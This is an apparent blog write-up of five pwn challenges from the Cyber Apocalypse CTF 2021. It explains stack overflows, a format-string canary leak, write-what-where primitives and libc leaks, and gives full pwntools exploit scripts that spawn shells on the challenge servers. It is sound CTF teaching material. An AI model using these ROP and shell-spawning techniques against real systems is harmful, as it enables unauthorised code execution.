---
layout: post
title: "Cyber Apocalypse CTF 2021 Pwn Solutions"
date: 2021-04-26 04:06:23 -0400
comments: true
categories: ctf
---

HackTheBox ran the Cyber Apocalypse CTF over a five day period. There were a lot of different challenges, but I joined for the sole purpose of just solving the Pwn category during my free time. Of the five challenges in the Pwn category, I solved four challenges during the CTF, and solved the last one the day after the CTF ended. I've listed my solution to all five challenges in this post. 

For anyone wondering what tools I used: 

* [pwntools](https://github.com/Gallopsled/pwntools) for writing the exploits. 
* [pwndbg](https://github.com/pwndbg/pwndbg) with `gdb` for debugging.
* [Cutter](https://cutter.re/) with Ghidra's decompiler for reverse engineering.


## Controller

This binary challenge includes a copy of `libc.so.6` and is compiled with Full RELRO and NX. 

When executed, the binary will ask the user to enter two numbers, and to select from a mathematical operation that will either add, subtract, multiple, or divide the numbers. As long as either of the numbers are not greater than 69, the operation succeeds and the result is printed back to the user. If either of the numbers are greater than 69, the binary exits. 

The vulnerability lies in the `calculator()` function where it checks if the result of the mathematical operation is equal to 0xff3a, or 65338 in decimal. If it is, it enters a code branch where it prompts the user for input using `__isoc99_scanf("%s")`. `__isoc99_scanf("%s")` does not perform bounds checking which allows us to write past the buffer and overwrite `calculator()`'s saved return pointer, and hijack the binary's execution flow. Specifically, the saved return pointer is 40 bytes from the end of the buffer `__isoc99_scanf()` writes to. 

Recall that the binary exits if either number entered by the user is greater than 69. This makes it impossible to provide two positive numbers that equal 65338. However, a second vulnerability exists, this time within the `calc()` function. The numbers entered are stored as unsigned integers which allow us to enter negative numbers. The result 65338 can be obtained by getting the difference of -65338 and -130876. 

Proof of concept where we overwrite the saved return pointer with "BBBBBBBB" (0x4242424242424242): 

```
► ./controller

👾 Control Room 👾

Insert the amount of 2 different types of recources: -65538 -130876
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 2
-65538 - -130876 = 65338
Something odd happened!
Do you want to report the problem?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Problem ingored
Segmentation fault (core dumped)
```

Examining the core dump shows that it tried to return to 0x4242424242424242: 

```
pwndbg> bt
#0  0x00000000004010fd in ?? ()
#1  0x4242424242424242 in ?? ()
#2  0x00007ffff7b87e00 in ?? ()
#3  0x0000000100000000 in ?? ()
#4  0x0000000000401170 in ?? ()
#5  0x00007f78a16c6b97 in ?? ()
#6  0x0000000000000001 in ?? ()
#7  0x00007ffff7b87ef8 in ?? ()
#8  0x0000000100008000 in ?? ()
#9  0x0000000000401124 in ?? ()
#10 0x0000000000000000 in ?? ()
```

```
pwndbg> f 1
#1  0x4242424242424242 in ?? ()
pwndbg> context
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x10
 RBX  0x0
 RCX  0x0
 RDX  0x401400
 RDI  0x401400
 RSI  0x0
 R8   0xa
 R9   0x7f78a1cb04c0 ◂— rol    byte ptr [rbx + rcx*8], 0xa1
 R10  0x0
 R11  0x246
 R12  0x4006b0
 R13  0x7ffff7b87ef0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7ffff7b87e00 ◂— 0x7ffff7b87e00
 RIP  0x4242424242424242 ('BBBBBBBB')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x4242424242424242

```

There are no "win" functions in this binary to return to that will print out the flag, or give us a shell. Getting a shell means finding a way to execute `execve("/bin/sh")` from libc. Since libc is randomized, we need to calculate the target's libc base address by leaking a function's libc address and subtracting its offset from the provided `libc.so.6`. 

One solution is to utilize ROP gadgets to pop the address of `puts()` from the GOT into the RDI register, and then return to `puts()` at the PLT to have it print out the address of `puts()` in libc: 

```
buf  = b"A"*40
buf += p64(rop.find_gadget(["pop rdi", "ret"])[0])      # pop rdi gadgat
buf += p64(elf.got.puts)                                # puts() in GOT
buf += p64(elf.plt.puts)                                # puts() in PLT

r.sendline(buf)

r.recvline()
puts_leak = int.from_bytes(r.recvline()[:6], "little")
print(f"puts@libc leak: 0x{puts_leak:2x}")
```

With the leaked libc address of `puts()`, it becomes trivial to calculate libc's base address:

```
libc.address = puts_leak - libc.sym.puts
print(f"libc base: 0x{libc.address:2x}")
```

To find a gadget that executes `execve("/bin/sh")`, we can use the `one_gadget` tool: 

```
► one_gadget  ./libc.so.6
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

We can add any of these offsets to libc's base address and return to that to get a shell, but first we need to get the binary to prompt us for more data. One way to do that is to return to the start of `calculator()` and exploit the stack buffer overflow again, but this time changing the saved return pointer to point to a one-gadget address that calls `execve()`. 

Here's the final exploit:

```
#!/usr/bin/env python3

from pwn import *

def send_numbers():
    # send numbers to calculator()
    print("Sending numbers...")
    r.recvuntil(": ")
    r.sendline("-65538 -130876")
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("> ")

context(os="linux", arch="amd64")
elf = context.binary = ELF("controller")
libc = ELF("./libc.so.6")

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

r = remote("165.227.237.7", 32710)

buf = b""
buf += b"A"*40
buf += p64(pop_rdi)             # pop rdi; ret
buf += p64(elf.got.puts)        # puts() at GOT
buf += p64(elf.plt.puts)        # return to puts() at PLT to leak puts() at libc
buf += p64(0x00401066)          # re-exploit calculator() again

send_numbers()

print("Sending payload 1...")
r.sendline(buf)

r.recvline()
puts_leak = int.from_bytes(r.recvline()[:6], "little")
print(f"puts@libc leak: 0x{puts_leak:2x}")

libc.address = puts_leak - libc.sym.puts
print(f"libc base: 0x{libc.address:2x}")

execve_gadget_offset = 0x4f3d5
execve_gadget = libc.address + execve_gadget_offset
print(f"execve gadget: 0x{execve_gadget:2x}")

# overwrite calculator()'s saved return pointer with execve() gadget
buf = b""
buf += b"A"*40 + p64(execve_gadget)

send_numbers()

print("Sending payload 2...")
r.sendline(buf)

print("Getting shell...")
r.interactive()
```

And here it is in action:

```
► ./sploit.py SILENT=1
Sending numbers...
Sending payload 1...
puts@libc leak: 0x7fe80cb5faa0
libc base: 0x7fe80cadf000
execve gadget: 0x7fe80cb2e3d5
Sending numbers...
Sending payload 2...
Getting shell...
Problem ingored
$ cat flag.txt
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
```
 
## Minefield

This binary challenge is compiled with a stack canary and NX. There is no RELRO which means we can overwrite function pointers in the GOT. 

The binary itself is very simple. It prompts the user if they're ready to plant a mine. Selecting No causes the binary to exit. Selecting Yes will prompt the user for a type of mine to use, and a location to plant it in. The user's input is passed to `strtoull()` which converts it into an unsigned long long value. If we examine the disassembly of `mission()`, we see that the "type of mine" is actually an address that "location of mine" is written to. This is effectively a write primitive that allows us to write a value anywhere in memory that's writable: 

```
0x00400ad5      mov     rdx, qword [location_of_mine]
0x00400ad9      mov     rax, qword [type_of_mine]
0x00400add      mov     qword [rax], rdx
```

The first thought was to overwrite a function pointer in the GOT, but there are actually no functions called right after `mission()` returns. If we look at the writable sections reported by Cutter, we see that `.fini_array` is at 0x601078. This location contains a pointer to `__do_global_dtors_aux` which handles destructors. 

```
pwndbg> x/a 0x601078
0x601078:	0x400860 <__do_global_dtors_aux>
```

Functions in `.fini_array` are called by the runtime linker when the program terminates. Since this section is writable, we can overwrite 0x601078 with an address of our choosing and control execution flow right before the binary terminates. 

As it turns out, this binary provides a "win" function that prints the flag. In this case, it's called `_()` at 0x40096b. Exploitation is pretty simple at this point. When asked for the type of mine, we enter 0x601078, and when asked for a location, we enter 0x40096b: 

```
#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64")
elf = context.binary = ELF("minefield")

r = remote("178.62.14.240", 31535)

r.recvuntil("> ")
r.sendline("2")

r.recvuntil(": ")
r.sendline("0x601078")           # .fini_array

r.recvuntil(": ")
r.sendline(str(elf.sym._))       # get_flag function 0x40096b
print(r.recvuntil("}"))
```

Running the script returns the flag: 

```
► ./sploit.py SILENT=1
b'We need to get out of here as soon as possible. Run!\n\nMission accomplished! \xe2\x9c\x94\nCHTB{d3struct0r5_m1n3f13ld}'
```

## System dROP

This binary challenge is compiled with partial RELRO and NX. The name appears to imply that ROP is required to exploit this. 

The binary itself is fairly small. The `main()` function just reads 256 bytes from the user using `read()`: 

```
0x00400541      push rbp
0x00400542      mov rbp, rsp
0x00400545      sub rsp, 0x20
0x00400549      mov edi, 0xf       ; 15
0x0040054e      call alarm         ; sym.imp.alarm
0x00400553      lea rax, [buf]
0x00400557      mov edx, 0x100     ; 256 ; size_t nbyte
0x0040055c      mov rsi, rax       ; void *buf
0x0040055f      mov edi, 0         ; int fildes
0x00400564      call read          ; sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x00400569      mov eax, 1
0x0040056e      leave
0x0040056f      ret
```

A user defined `syscall()` function exists for the sole purpose of providing a `syscall` gadget:

```
0x00400537      push rbp
0x00400538      mov rbp, rsp
0x0040053b      syscall
0x0040053d      ret
```

There are no "win" functions, so that means we need to get a shell by executing `execve("/bin/sh")`. My initial thought was to use a `mprotect` syscall on a writable section to make it executable, `read()` shellcode into that location, and then return to it to get a shell. `mprotect` requires four parameters that need to be set in RDI, RSI, RDX, and RCX. A quick look at what gadgets are available in the binary show that we only have a pop RDI and RSI that are immediately accessible: 

```
► ropper --file system_drop --search 'pop r??'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r??

[INFO] File: system_drop
0x00000000004005cc: pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004005ce: pop r13; pop r14; pop r15; ret;
0x00000000004005d0: pop r14; pop r15; ret;
0x00000000004005d2: pop r15; ret;
0x00000000004004ab: pop rbp; mov edi, 0x601038; jmp rax;
0x00000000004005cb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x00000000004005cf: pop rbp; pop r14; pop r15; ret;
0x00000000004004b8: pop rbp; ret;
0x00000000004005d3: pop rdi; ret;
0x00000000004005d1: pop rsi; pop r15; ret;
0x00000000004005cd: pop rsp; pop r13; pop r14; pop r15; ret;
```

After some initial testing, it became clear that the `mprotect`>`read()` chain would be too large to fit in 256 bytes as it would require us to utilize a `__libc_csu_init()` chain to store data in the RDX and RCX registers. A different approach was required. 

Upon closer examination of `main()`'s disassembly, the binary sets EAX to 1 right after `read()` is called. When `syscall` is called and RAX is 1, it calls the `write` syscall. This could be leveraged to call `write` and leak a libc address from the GOT. 

The GOT itself only contained entries for `alarm()` and `read()`: 

```
[0x601018] alarm@GLIBC_2.2.5 -> 0x7ffff7ac8840 (alarm) ◂— mov    eax, 0x25
[0x601020] read@GLIBC_2.2.5 -> 0x7ffff7af4070 (read) ◂— lea    rax, [rip + 0x2e0881]
```

With a libc leak, we can calculate libc's base address and return to an `execve("/bin/sh")` gadget. While the binary didn't come with an included `libc.so.6`, we did have one from the Controller challenge. I made the assumption that both binaries used the same version of libc and used it for the exploit. Here's the first part of our exploit that leaks `alarm()` at libc's address, and calculates libc's base address: 

```
from pwn import *

context(os="linux", arch="amd64")
elf = context.binary = ELF("./system_drop")

libc = ELF("./libc.so.6")

pop_rdi = 0x4005d3               # pop rdi
pop_rsi_chain = 0x4005d1         # pop rsi; pop r15; ret
syscall = 0x40053b               # syscall; ret

# Stage 1 : Leak a libc address
# After the binary calls read(), it sets eax=1 which we can use for a write() syscall to leak
# alarm()'s libc address
buf = b"A"*40
buf += p64(pop_rdi)
buf += p64(0x1)                 # stdout
buf += p64(pop_rsi_chain)
buf += p64(elf.got.alarm)       # alarm@got
buf += p64(0x0)
buf += p64(syscall)             # write() syscall which should give us the libc address we need

r.sendline(buf)
alarm_libc_leak = int.from_bytes(r.recv()[:6], "little")
print(f"alarm@libc: 0x{alarm_libc_leak:2x}")

libc.address = alarm_libc_leak - libc.sym.alarm
print(f"libc base: 0x{libc.address:2x}")
```

So far so good:

```
► ./sploit.py SILENT=1
alarm@libc: 0x7f6da9056610
libc base: 0x7f6da8f72000
```

We already have a list of `execve()` offsets from the Controller challenge when we ran `one_gadget`. In order to execute it, we need to overwrite a function pointer in the GOT with the address of the `execve()` gadget. We can overwrite the address of `alarm()` at the GOT, and then call `alarm()` at PLT to call the `execve()` gadget. To do that, we need to call `read()` at PLT with the RDI register set to 0 (stdout), and RSI set to the address of `alarm()` at the GOT:

```
# Stage 2 : We have libc and calculated the address of a one-gadget-rce at this point
# Call read() again to overwrite alarm@got with one-gadget-rce
buf += p64(pop_rdi)
buf += p64(0x0)                 # stdout
buf += p64(pop_rsi_chain)       # pop rsi; pop r15; ret
buf += p64(elf.got.alarm)       # alarm@got
buf += p64(0x0)                 # junk for r15
buf += p64(read_plt)            # read() in our one-gadget-rce into alamr@got
```

When this chain executes, the binary will wait for input. At this point we can send the address of the `execve()` gadget to overwrite `alarm()` at the GOT, and then return to `alarm()` at the PLT. 

Here's the final exploit: 

```
#!/usr/bin/env python3
from pwn import *

context(os="linux", arch="amd64")
elf = context.binary = ELF("system_drop")

libc = ELF("libc.so.6")

read_plt = elf.plt.read

pop_rdi = 0x4005d3               # pop rdi
pop_rsi_chain = 0x4005d1         # pop rsi; pop r15; ret
syscall = 0x40053b               # syscall; ret

r = remote("139.59.185.150",30477)

# Stage 1 : Leak a libc address
# After the binary calls read(), it sets eax=1 which we can use for a write() syscall to leak
# alarm()'s libc address
buf = b"A"*40
buf += p64(pop_rdi)
buf += p64(0x1)                 # stdout
buf += p64(pop_rsi_chain)
buf += p64(elf.got.alarm)       # alarm@got
buf += p64(0x0)
buf += p64(syscall)             # write() syscall which should give us the libc address we need

# Stage 2 : We have libc and calculated the address of a one-gadget-rce at this point
# Call read() again to overwrite alarm@got with one-gadget-rce
buf += p64(pop_rdi)
buf += p64(0x0)                 # stdout
buf += p64(pop_rsi_chain)
buf += p64(elf.got.alarm)       # alarm@got
buf += p64(0x0)
buf += p64(read_plt)            # read() in our one-gadget-rce into alamr@got

# Stage 3 : Call alarm() to trigger call to do_system()
buf += p64(elf.plt.alarm)

r.sendline(buf)

alarm_libc_leak = int.from_bytes(r.recv()[:6], "little")
print(f"alarm@libc: 0x{alarm_libc_leak:2x}")

libc.address = alarm_libc_leak - libc.sym.alarm
print(f"libc base: 0x{libc.address:2x}")

execve_gadget = libc.address + 0x4f432        # execve() gadget offset
r.sendline(p64(execve_gadget))

r.interactive()
```

Running it gives us a shell on the server to get the flag: 

```
► ./sploit.py SILENT=1
alarm@libc: 0x7fc3459f7610
libc base: 0x7fc345913000
[*] Switching to interactive mode
$ ls
flag.txt  system_drop
$ cat flag.txt
CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
```

## Harvester

This binary challenge includes a copy of `libc.so.6` and is compiled with the works: Full RELRO, NX, stack canary, and PIE. When executed, the binary gives the user four options: 

```
► ./harvester

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
>
```

After spending some time analyzing the binary in Cutter, we can determine the following: 

### Fight

The `fight()` function prompts the user to select a weapon by reading 5 bytes from the user using `read()`. Whatever weapon is selected results in the message "You are not strong enough to fight yet.". A format string vulnerability exists in this function which allows us to read pointers on the stack. We are able to leak the stack canary at positions 11, 15, and 19, as well as a libc address (`__libc_start_main()+231`) at position 21.

Leaking the stack canary: 

```
Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> %11$p

Your choice is: 0x5420ef415fb19a00
You are not strong enough to fight yet.
```

Leaking `__libc_start_main()+231`: 

```
Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> %21$p

Your choice is: 0x7ffb61a7fb97
You are not strong enough to fight yet.
```

### Inventory

The `inventory()` function lists the number of pies a user has, and asks if they want to drop some pies, and how many. A vulnerability exists in this function where if a user enters a negative number, it actually increases the number of pies they have. A user starts with 10 pies, and dropping -10 pies leaves the user with 20 pies. The use of this vulnerability will become evident in the Stare option.  

### Stare

The `stare()` function attempts to find a weakness in the Harvester, but will fail, and instead reward the user with 1 pie. Once the user has 15 pies, the message "You cannot carry more" is printed and the binary exits. There is a hidden branch in this function where if a user has 22 pies, the binary prompts the user to enter a string of up to 64 bytes. 

```
    rdi = "\n[+] You found 1 ";
    printstr ();
    eax = *(pie);
    eax++;
    eax = *(pie);
    if (eax == 0x16) {
        eax = 0;
        printf ("\e[1;32m");
        rdi = "\nYou also notice that if the Harvester eats too many pies, it falls asleep.";
        printstr ();
        rdi = "\nDo you want to feed it?\n> ";
        printstr ();
        rax = &buf;
        read (0, rax, 0x40);
        eax = 0;
        printf ("\e[1;31m");
        rdi = "\nThis did not work as planned..\n";
        printstr ();
    }
```

A stack buffer overflow vulnerability exists which allows us to overwrite `stare()`'s saved return pointer. The saved return pointer is 56 bytes from the end of the buffer. In order to reach this code branch, we need to leverage the Inventory vulnerability to drop -11 pies so that the user ends up with 21 pies. When Stare is called, an extra pie is added to our inventory, leaving us with 22 pies. 

### Run

This simply exits the binary. 

### Exploitation

We have everything we need to exploit the binary: 

1. Use Fight to leak the stack canary and a libc address. Calculate libc's base address and get the offset of a `execve("/bin/sh")` gadget using the `one_gadget` tool. 
1. Use Inventory to drop -11 pies to get the 22 pies needed to enter the vulnerable code branch in Stare. 
1. Use Stare and send a large enough payload that overwrites the stack canary with the leaked canary, and overwrites the saved return pointer to return to the `execve()` gadget. 

Here's the final exploit: 

```
#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64")
elf = context.binary = ELF("harvester")
libc = ELF("libc.so.6")

r = remote("165.227.232.115", 30465)

# Use Fight to leak stack canary at position 11
r.recvuntil("> ")
r.sendline("1")
r.recvuntil("> ")
r.sendline("%11$p")
r.recvuntil("is: ")
canary = r.recvuntil("\n")[:18].decode("utf-8")
print("leaked stack canary:", canary)

# Use Fight to leak a libc address at position 21
r.sendline("1")
r.recvuntil("> ")
r.sendline("%21$p")                             # leaks __libc_start_main+231
r.recvuntil("is: ")
libc_leak = r.recvuntil("\n")[:14].decode("utf-8")
print("leaked libc address:", libc_leak)

libc.address = int(libc_leak, 16) - 138231      # offset of __libc_start_main+231
print(f"libc base: 0x{libc.address:2x}")

# Use Inventory to increase pies to 21
r.sendline("2")
r.recvuntil("> ")
r.sendline("y")
r.recvuntil("> ")
r.sendline("-11")                               # drop -11 pies
r.recvuntil("> ")

# Use Stare to exploit buffer overflow
r.sendline("3")
r.recvuntil("> ")

execve_gadget = libc.address + 0x4f3d5          # execve() gadget offset

buf  = b"A"*40
buf += p64(int(canary, 16))                     # preserve stack canary
buf += p64(0x0)                                 # padding
buf += p64(execve_gadget)                       # return to execve() gadget
r.sendline(buf)

print("Getting shell...")
r.interactive()
```

Here it is in action popping a shell on the server: 

```
► ./sploit.py SILENT=1
leaked stack canary: 0x32e62f8c8bdc5e00
leaked libc address: 0x7f7ea9cfbbf7
libc base: 0x7f7ea9cda000
Getting shell...

You try to find its weakness, but it seems invincible..
Looking around, you see something inside a bush.
[+] You found 1 \\x9f\xa5\xa7!

You also notice that if the Harvester eats too many pies, it falls asleep.
Do you want to feed it?
>
This did not work as planned..
$ ls
flag.txt  harvester  libc.so.6
$ cat flag.txt
CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
```

## Save the Environment

This binary challenge includes a copy of `libc.so.6` and is compiled with Full Relro, stack canary, and NX. 

I did not complete this challenge during the CTFs allotted time frame, but completed it the day after. When executed, the binary prompts us for two options; plant a tree, or recycle. After analyzing the binary in Cutter, we can determine the following: 

### Plant

The `plant()` function prompts the user for a type of tree to plant, and then a location to plant the tree. If this sounds familiar, it should, because the Minefield challenge used the same thing. This is essentially a write primitive that allows us to write to any writable memory address. The difference here is that the binary is compiled with Full RELRO so we can't write to the GOT or `.fini_array`. We can only do this once. After `plant()` is called, the binary sets `rec_count` to 0x16. This causes the binary to exit when `check_fun()` is called and `rec_count` is greater than 0xb: 

```
    if (rec_count >= 0) {
        if (rec_count <= 0xb) {
            goto label_0;
        }
    }
    rsi = "green";
    rdi = "We have plenty of this already.\nThanks for your help!\n";
    eax = 0;
    color ();
    exit (1);
```


### Recycle

The `recycle()` function prompt the user for what material to recycle. Whatever option the user selects, the `form()` function is called which asks the user if this is their first time recycling. A counter is maintained in 0x603080 as `rec_count` which keeps track of how many times a user has recycled. If the user recyles 5 times, the binary leaks the libc address of `printf()`. If the user recycles 10 times, the binary allows the user to enter an arbitrary address and leaks its value. This is effectively a read primitive. 

### Win function

A function called `hidden_resources()` will print the contents of the flag. This function isn't called by anything, so this is the target function we want to return to. 

### Exploitation

Full RELRO prevents us from writing to the GOT or `.fini_array`. We can write to `__malloc_hook()` or `__free_hook()` in libc, but there's nothing in the binary that would trigger a call to those functions. The only other option is to overwrite a saved return pointer on the stack, but in order to do that, we need a stack leak. 

As it turns out, we can leak a stack address by leaking `environ` in libc. `environ` contains a pointer to an address on the stack. By taking the difference of `environ` on the stack, and `plant()`'s saved return pointer on the stack, we can determine how many bytes to subtract from the leaked stack address and use `plant()` to overite the saved return pointer with the address of `hidden_resources()`. When `plant()` returns, it calls `hidden_resources()` which prints out the flag. 

This is the exploitaiton flow: 

1. Recycle 5 times to leak `printf()`'s libc address and calculate libc's base address. 
1. Recycle 5 more times to allow us to leak the address of `environ` on the stack by sending `environ`'s libc address (libc base address + `environ`'s offset in libc). 
1. Calculate the difference between `environ` on the stack and `plant()`'s saved return pointer on the stack.
1. Use the write primitive to overwrite `plant()`'s saved return pointer with the address of `hidden_resources()`.

Here's the final exploit: 

```
#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64")
elf = context.binary = ELF("environment")
libc = ELF("./libc.so.6")

def recycle(count):
    for i in range(count):
        r.recvuntil("> ")
        r.sendline("2")
        r.recvuntil("> ")
        r.sendline("1")
        r.recvuntil("> ")
        r.sendline("n")
        r.recvline()
        d  = r.recvline()
    return d

def plant(retptr, win):
    r.sendline("1")
    r.recvuntil("> ")
    r.sendline(str(retptr))
    r.recvuntil("> ")
    r.sendline(str(win))
    print(r.recvall())      # return the flag

r = remote("138.68.182.108", 31093)

# leak libc address (printf)
d = recycle(5)
d = d.decode("utf-8")[-16:].replace("]", "")
printf_libc = int(d, 16)
print(f"printf@libc: 0x{printf_libc:2x}")

# get libc base address and find environ pointer in libc
libc.address = printf_libc - libc.sym.printf
print(f"libc base  : 0x{libc.address:2x}")
print(f"environ libc: 0x{libc.sym.environ:2x}")

# leak stack address via environ pointer in libc
d = recycle(5)
r.sendline(str(libc.sym.environ))
environ_stack = int.from_bytes(r.recvline()[-7:-1], "little")
print(f"environ stack: 0x{environ_stack:2x}")

# get plant()'s saved return pointer by subtracting 288 bytes from environ
plant_retptr = environ_stack - 288
print(f"plant() saved return pointer: 0x{plant_retptr:2x}")

# overwrite plant()'s saved return pointer with hidden_resources()
plant(plant_retptr, elf.sym.hidden_resources)
```

And here it is retrieving the flag: 

```
► ./sploit.py SILENT=1
printf@libc: 0x7f85ab613f70
libc base  : 0x7f85ab5af000
environ libc: 0x7f85ab99d098
environ stack: 0x7fffeb322988
plant() saved return pointer: 0x7fffeb322868
b'\n\x1b[1;32765;32mWhere do you want to plant?\n1. City\n2. Forest\n\x1b[0m> Thanks a lot for your contribution!\nYou found a hidden vault with resources. You are very lucky!\nCHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}\n'
```

